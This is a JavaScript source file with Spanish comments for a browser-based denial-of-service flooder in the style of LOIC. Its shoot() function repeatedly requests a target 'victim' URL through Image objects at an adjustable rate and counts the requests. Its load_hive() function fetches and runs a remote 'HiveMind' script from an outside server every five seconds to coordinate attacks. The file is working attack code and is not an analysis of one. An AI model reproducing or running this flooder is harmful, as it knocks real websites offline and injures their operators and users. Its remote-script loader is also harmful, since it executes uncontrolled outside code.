//Variables globales.
var fire;
var randomID;
var request = 0;

//Modifica la cadencia cuando cambia el valor del slide.
function move_slide(){
	if (document.getElementById('state').innerHTML == 'start') {
		clearInterval(fire);
		fire = setInterval('shoot()', $('#sl0').mbgetVal());
	}
}

//Controla el botón para pausar el ataque.
function start_stop(){
	if (document.getElementById('state').innerHTML == 'stop') {
		document.getElementById('state').innerHTML = 'start';
		document.getElementById('start').value = 'STOP TEH\nFLOODING';
		fire = setInterval('shoot()', $('#sl0').mbgetVal());
	}
	else {
		document.getElementById('state').innerHTML = 'stop';
		document.getElementById('start').value = 'IMMA CHARGING\nMAH LAZER';
		clearInterval(fire);
	}
}

//Carga la página de la víctima de forma recursiva.
//Aunque creo que los servidores actuales deben procesar
//estas peticiones como mantequilla no cambio esto porque
//todavía no he probado su efectividad.
function shoot(){
	var target = document.getElementById('target').value;
	var msg = document.getElementById('msg').value;
	var resource = new Image();
	var randomID = Number(new Date());
	resource.onload = function () { score_requested(); }; //A no ser que el objetivo sea una imágen siempre
	resource.onerror = function () { score_requested(); }; //va a dar error, pero mientras obtenga una
	resource.setAttribute("src", target + "?LOWC=" + msg); //una respuesta del servidor me vale.
	request[randomID] = resource;
	score_tail();
}

//Ciclos del intervalo efectuados.
function score_tail(){
	//-----------------------------------------------------
	//Por ahora no está lista la función de atacar varias
	//veces en el mismo intervalo, por lo que se queda el
	//valor por defecto de esta variable, 1.
	var calibre = document.getElementById('calibre').value;
	//-----------------------------------------------------
	var tail = document.getElementById('counter_tail').innerHTML;
	document.getElementById('counter_tail').innerHTML = parseInt(tail) + parseInt(calibre);
}

//Cargas completas de la web víctima efectuadas.
function score_requested(){
	document.getElementById('counter_requested').innerHTML++;
	delete request[randomID];
}

//Carga el HiveMind desde un servidor externo.
function load_hive(){
	document.getElementById('hiveContainer').innerHTML = null;
	var hiveURL = document.getElementById('hiveURL').value;
	var script = document.createElement('script');
	script.setAttribute('type','text/javascript'),
	script.setAttribute('src',hiveURL);
	document.getElementById('hiveContainer').appendChild(script);
	setInterval('load_hive()', 5000);
	//document.getElementById('target').value = target;
	//document.getElementById('msg').value = msg;
}